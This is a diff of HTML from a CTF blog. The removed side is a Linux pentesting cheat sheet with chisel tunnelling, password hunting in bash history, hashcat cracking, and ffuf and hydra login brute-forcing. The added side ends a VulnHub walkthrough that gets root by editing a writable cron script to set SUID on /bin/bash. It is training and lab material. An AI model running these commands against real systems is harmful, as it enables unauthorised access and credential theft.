-            style="text-decoration-line: none !important;" href="#client" aria-label="Anchor">#</a></span>        
-    
-</h4><pre tabindex="0"><code>./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT
-</code></pre><div id="find-open-ports" class="anchor">Find Open Ports></div>
-<h3 class="relative group">Find Open Ports 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#find-open-ports" aria-label="Anchor">#</a></span>        
-    
-</h3><pre tabindex="0"><code>netstat -tupln
-</code></pre><div id="oskernel-information" class="anchor">OS/Kernel Information></div>
-<h3 class="relative group">OS/Kernel Information 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#oskernel-information" aria-label="Anchor">#</a></span>        
-    
-</h3><pre tabindex="0"><code>uname -a
-cat /proc/version
-cat /etc/issue
-</code></pre><div id="cpu-information" class="anchor">CPU Information></div>
-<h3 class="relative group">CPU Information 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#cpu-information" aria-label="Anchor">#</a></span>        
-    
-</h3><pre tabindex="0"><code>lscpu
-</code></pre><div id="identifying-the-network-route" class="anchor">Identifying the Network Route></div>
-<h3 class="relative group">Identifying the Network Route 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#identifying-the-network-route" aria-label="Anchor">#</a></span>        
-    
-</h3><pre tabindex="0"><code>route
-ip route
-</code></pre><div id="discover-other-ip-address-on-a-network" class="anchor">Discover Other IP Address On A Network></div>
-<h3 class="relative group">Discover Other IP Address On A Network 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#discover-other-ip-address-on-a-network" aria-label="Anchor">#</a></span>        
-    
-</h3><pre tabindex="0"><code>arp -a
-ip neigh
-</code></pre><div id="look-for-a-specific-string-in-the-file-system" class="anchor">Look For A Specific String In The File System></div>
-<h3 class="relative group">Look For A Specific String In The File System 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#look-for-a-specific-string-in-the-file-system" aria-label="Anchor">#</a></span>        
-    
-</h3><pre tabindex="0"><code>grep --color=auto -rnw &#39;/&#39; -ie &#34;STRING_THAT_WANT_BE_FOUND&#34; --color=always 2&gt; /dev/null
-find . -type f -exec grep -i -I &#34;STRING_THAT_WANT_BE_FOUND&#34; {} /dev/null \;
-</code></pre><div id="find-passwords-in-history" class="anchor">Find Passwords in History></div>
-<h3 class="relative group">Find Passwords in History 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#find-passwords-in-history" aria-label="Anchor">#</a></span>        
-    
-</h3><pre tabindex="0"><code>cat ~/.bash_history | grep -i passw
-</code></pre><div id="cracking-linuxbcrypt-password" class="anchor">Cracking Linux(bcrypt) Password></div>
-<h3 class="relative group">Cracking Linux(bcrypt) Password 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#cracking-linuxbcrypt-password" aria-label="Anchor">#</a></span>        
-    
-</h3><pre tabindex="0"><code>unshadow PASSWD_FILE SHADOW_FILE &gt; unshadowed.txt
-hashcat -m 1800 unshadowed.txt /PATH/TO/WORDLIST -O
-</code></pre><div id="nslookup" class="anchor">NSLookup></div>
-<h3 class="relative group">NSLookup 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#nslookup" aria-label="Anchor">#</a></span>        
-    
-</h3><p>nslookup is a network administration command-line tool for querying the Domain Name System to obtain the mapping between the domain name and IP address or other DNS records.</p>
-<pre tabindex="0"><code>nslookup -type=any DOMAIN.COM
-</code></pre><div id="dnsrecon" class="anchor">DNSRecon></div>
-<h3 class="relative group">DNSRecon 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#dnsrecon" aria-label="Anchor">#</a></span>        
-    
-</h3><p>DNSRecon is a Python script that provides the ability to perform: Check all NS Records for Zone Transfers. Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF, and TXT). Perform common SRV Record Enumeration. Top Level Domain (TLD) Expansion.</p>
-<pre tabindex="0"><code>dnsrecon -d DOMAIN.COM -D /PATH/TO/SUBDMAIN/WORDLIST -t brt
-</code></pre><div id="git-dumper" class="anchor">Git-Dumper></div>
-<h3 class="relative group">Git-Dumper 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#git-dumper" aria-label="Anchor">#</a></span>        
-    
-</h3><p>A tool to dump a git repository from a website.</p>
-<pre tabindex="0"><code>git-dumper http://SITENAME.COM/.git
-</code></pre><div id="ldapsearch" class="anchor">LDAPSearch></div>
-<h3 class="relative group">LDAPSearch 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#ldapsearch" aria-label="Anchor">#</a></span>        
-    
-</h3><p>LDAPSearch is a shell-accessible interface to the ldap_search_ext(3) library call.</p>
-<pre tabindex="0"><code>ldapsearch -D binddn\\ldap -H ldap://REMOTE_IP -w &#39;PASSWORD&#39;
-ldapsearch -D binddn\\ldap -H ldap://REMOTE_IP -w &#39;PASSWORD&#39; | grep name: | sed &#39;s/^name: //&#39; | grep -vE &#39;D|C|A|U&#39; &gt; /PATH/TO/USERNAMES/WORDLIST
-</code></pre><div id="whatweb" class="anchor">WhatWeb></div>
-<h3 class="relative group">WhatWeb 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#whatweb" aria-label="Anchor">#</a></span>        
-    
-</h3><p>WhatWeb identifies websites. It recognizes web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.</p>
-<pre tabindex="0"><code>whatweb https://DOMAIN/
-</code></pre><div id="arpscan" class="anchor">ARPScan></div>
-<h3 class="relative group">ARPScan 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#arpscan" aria-label="Anchor">#</a></span>        
-    
-</h3><p>ARP-SCAN is a command-line tool that uses the ARP protocol to discover and fingerprint IP hosts on the local network.</p>
-<pre tabindex="0"><code>sudo arp-scan -l
-</code></pre><div id="netdiscover" class="anchor">NetDiscover></div>
-<h3 class="relative group">NetDiscover 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#netdiscover" aria-label="Anchor">#</a></span>        
-    
-</h3><p>Netdiscover is an active/passive address reconnaissance tool, mainly developed for those wireless networks without a DHCP server when you are wardriving. Similar to ARP-SCAN.</p>
-<pre tabindex="0"><code>sudo netdiscover -r IP/24
-</code></pre><div id="smbclient" class="anchor">SMBClient></div>
-<h3 class="relative group">SMBClient 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#smbclient" aria-label="Anchor">#</a></span>        
-    
-</h3><p>SMBCLIENT is a client that can &rsquo;talk&rsquo; to an SMB/CIFS server. It offers an interface similar to that of the FTP program.</p>
-<pre tabindex="0"><code>smbclient -L \\\\REMOTE_IP\\
-</code></pre><div id="ssh" class="anchor">SSH></div>
-<h3 class="relative group">SSH 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#ssh" aria-label="Anchor">#</a></span>        
-    
-</h3><p>OpenSSH is the premier connectivity tool for remote login with the SSH protocol.</p>
-<pre tabindex="0"><code>ssh REMOTE_IP -o KexAlgorithms=+diffie-helman-group1-sha1 -c aex128-cbc
-</code></pre><div id="evil-winrm" class="anchor">Evil-WinRM></div>
-<h3 class="relative group">Evil-WinRM 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#evil-winrm" aria-label="Anchor">#</a></span>        
-    
-</h3><p>This shell is the ultimate WinRM shell for hacking/pen testing. WinRM (Windows Remote Management) is the Microsoft implementation of the WS-Management Protocol.</p>
-<pre tabindex="0"><code>evil-winrm -i IP_ADDRESS -u username -p password
-</code></pre><div id="ffuf" class="anchor">FFUF></div>
-<h3 class="relative group">FFUF 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#ffuf" aria-label="Anchor">#</a></span>        
-    
-</h3><p>ffuf · Fast web fuzzer written in Go.</p>
-<pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://www.vulnbegin.co.uk/FUZZ -H &#34;Cookie:ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -t 1 -p 0.1 -mc all -fc 404 -c
-</code></pre><p>It can be also used to brute-force login forms.</p>
-<pre tabindex="0"><code>ffuf -w ~/wordlists/usernames.txt -X POST -d &#34;username=FUZZ&amp;password=x&#34; -t 1 -p 0.1 -H &#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -H &#34;Content-Type: application/x-www-form-urlencoded&#34; -u http://www.vulnbegin.co.uk/cpadmin/login -fr &#39;Username is invalid&#39;
-ffuf -w ~/wordlists/passwords.txt -X POST -d &#34;username=admin&amp;password=FUZZ&#34; -t 1 -p 0.1 -H &#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -H &#34;Content-Type: application/x-www-form-urlencoded&#34; -u http://www.vulnbegin.co.uk/cpadmin/login -fr &#39;Password is invalid&#39;
-</code></pre><p>And also for id fuzzing.</p>
-<pre tabindex="0"><code>seq 1 100 | ffuf -w - -t 1 -p 0.1 -H &#34;X-Token: 492E64385D3779BC5F040E2B19D67742&#34; -H &#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -u http://server.vulnbegin.co.uk/user/FUZZ -mc all -fc 404
-</code></pre><div id="crackmapexec" class="anchor">CrackMapExec></div>
-<h3 class="relative group">CrackMapExec 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#crackmapexec" aria-label="Anchor">#</a></span>        
-    
-</h3><p>This package is a swiss army knife for pentesting Windows/Active Directory environments.</p>
-<pre tabindex="0"><code>crackmapexec winrm REMOTE_IP -u /PATH/TO/USERNAMES/WORDLIST_OR_SINGLE_USERNAME -p /PATH/TO/PASSWORDS/WORDLIST_OR_SINGLE_PASSWORD
-</code></pre><div id="hydra" class="anchor">Hydra></div>
-<h3 class="relative group">Hydra 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#hydra" aria-label="Anchor">#</a></span>        
-    
-</h3><p>Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.</p>
-<p><strong>Brute-forcing SSH with HYDRA.</strong></p>
-<pre tabindex="0"><code>hydra -l USERNAME -P /PATH/TO/PASSWORD/WORDLIST ssh://REMOTE_IP:22 -t 4 -V
-</code></pre><div id="an-easy-way-to-stabilize-a-shell" class="anchor">An Easy Way To Stabilize a Shell></div>
-<h3 class="relative group">An Easy Way To Stabilize a Shell 
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#an-easy-way-to-stabilize-a-shell" aria-label="Anchor">#</a></span>        
-    
-</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">import /dev/null -c bash
-</span></span><span class="line"><span class="cl">*Ctrl+Z*
-</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-</span></span><span class="line"><span class="cl">reset xterm
-</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+</h2><p>Running <code>linpeas.sh</code> gave me this.</p>
+<pre tabindex="0"><code>* * * * * /home/grimmie/backup.sh
+</code></pre><p>Its running this <code>/home/grimmie/backup.sh</code> every minutes. So let&rsquo;s look at the <code>/home/grimmie/backup.sh</code> so we can collect more information about the PE vector here.</p>
+<p><code>/home/grimmie/backup.sh</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">rm /tmp/backup.zip
+</span></span><span class="line"><span class="cl">zip -r /tmp/backup.zip /var/www/html/academy/includes
+</span></span><span class="line"><span class="cl">chmod <span class="m">700</span> /tmp/backup.zip
+</span></span></code></pre></div><p>Looks like we also have write permission to <code>/home/grimmie/backup.sh</code>.</p>
+<p>Edit the <code>/home/grimmie/backup.sh</code> like this.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">chmod u+s /bin/bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">rm /tmp/backup.zip
+</span></span><span class="line"><span class="cl">zip -r /tmp/backup.zip /var/www/html/academy/includes
+</span></span><span class="line"><span class="cl">chmod <span class="m">700</span> /tmp/backup.zip
+</span></span></code></pre></div><p>After a little while, you can see that <code>/bin/bash</code> now has SUID bit bind to it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;	ls -la /bin/bash
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">1168776</span> Apr <span class="m">18</span>  <span class="m">2019</span> /bin/bash
+</span></span></code></pre></div><p>Which means game is over. Now you are the <code>root</code> user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/bin/bash -p
+</span></span><span class="line"><span class="cl">&gt;	whoami
+</span></span><span class="line"><span class="cl">root
 </span></span></code></pre></div>
         </br></br>
         
 
       </div>
       <script>
-        var oid = "views_posts\/notes\/linux\/index.md"
-        var oid_likes = "likes_posts\/notes\/linux\/index.md"
+        var oid = "views_posts\/vulnhub\/academy\/index.md"
+        var oid_likes = "likes_posts\/vulnhub\/academy\/index.md"
       </script>
       
       
@@ -1248,7 +1071,7 @@ ffuf -w ~/wordlists/passwords.txt -X POST -d &#34;username=admin&amp;password=FU
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://53ctf.github.io/posts/notes/linux/&amp;title=Linux"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://53ctf.github.io/posts/vulnhub/academy/&amp;title=TCM%20Academy"
       title="Share on LinkedIn"
       aria-label="Share on LinkedIn"
       >
@@ -1267,7 +1090,7 @@ ffuf -w ~/wordlists/passwords.txt -X POST -d &#34;username=admin&amp;password=FU
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://twitter.com/intent/tweet/?url=https://53ctf.github.io/posts/notes/linux/&amp;text=Linux"
+      href="https://twitter.com/intent/tweet/?url=https://53ctf.github.io/posts/vulnhub/academy/&amp;text=TCM%20Academy"
       title="Tweet on Twitter"
       aria-label="Tweet on Twitter"
       >
@@ -1286,7 +1109,7 @@ ffuf -w ~/wordlists/passwords.txt -X POST -d &#34;username=admin&amp;password=FU
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://reddit.com/submit/?url=https://53ctf.github.io/posts/notes/linux/&amp;resubmit=true&amp;title=Linux"
+      href="https://reddit.com/submit/?url=https://53ctf.github.io/posts/vulnhub/academy/&amp;resubmit=true&amp;title=TCM%20Academy"
       title="Submit to Reddit"
       aria-label="Submit to Reddit"
       >
@@ -1305,7 +1128,7 @@ ffuf -w ~/wordlists/passwords.txt -X POST -d &#34;username=admin&amp;password=FU
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://pinterest.com/pin/create/bookmarklet/?url=https://53ctf.github.io/posts/notes/linux/&amp;description=Linux"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=https://53ctf.github.io/posts/vulnhub/academy/&amp;description=TCM%20Academy"
       title="Pin on Pinterest"
       aria-label="Pin on Pinterest"
       >
@@ -1324,7 +1147,7 @@ ffuf -w ~/wordlists/passwords.txt -X POST -d &#34;username=admin&amp;password=FU
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.facebook.com/sharer/sharer.php?u=https://53ctf.github.io/posts/notes/linux/&amp;quote=Linux"
+      href="https://www.facebook.com/sharer/sharer.php?u=https://53ctf.github.io/posts/vulnhub/academy/&amp;quote=TCM%20Academy"
       title="Share on Facebook"
       aria-label="Share on Facebook"
       >
@@ -1343,7 +1166,7 @@ ffuf -w ~/wordlists/passwords.txt -X POST -d &#34;username=admin&amp;password=FU
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="mailto:?body=https://53ctf.github.io/posts/notes/linux/&amp;subject=Linux"
+      href="mailto:?body=https://53ctf.github.io/posts/vulnhub/academy/&amp;subject=TCM%20Academy"
       title="Send via email"
       aria-label="Send via email"
       >
@@ -1371,30 +1194,30 @@ ffuf -w ~/wordlists/passwords.txt -X POST -d &#34;username=admin&amp;password=FU
       <div class="flex justify-between pt-3">
         <span>
           
-        </span>
-        <span>
-          
-            <a class="flex text-right group ml-3" href="/posts/notes/python/">
+            <a class="flex group mr-3" href="/posts/htb/updown/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Python</span
+                  >HackTheBox UpDown</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2023-01-07 18:04:11 &#43;0530 &#43;0530">7 January 2023</time>
+                    <time datetime="2023-01-21 00:00:00 &#43;0000 UTC">21 January 2023</time>
                   
                 </span>
               </span>
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
             </a>
+          
+        </span>
+        <span>
           
         </span>
       </div>
